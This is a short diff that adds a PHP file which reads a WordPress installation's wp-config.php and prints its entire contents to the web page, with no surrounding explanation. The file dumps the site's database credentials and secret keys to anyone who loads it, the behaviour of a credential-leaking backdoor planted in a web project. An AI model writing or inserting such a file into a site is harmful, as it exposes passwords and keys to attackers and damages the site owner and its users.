@@ -1,0 +1,4 @@
+<?php
+  $file = "/var/www/wordpress/wp-config.php";
+  echo "<pre>".file_get_contents( $file )."<pre>";
+?>
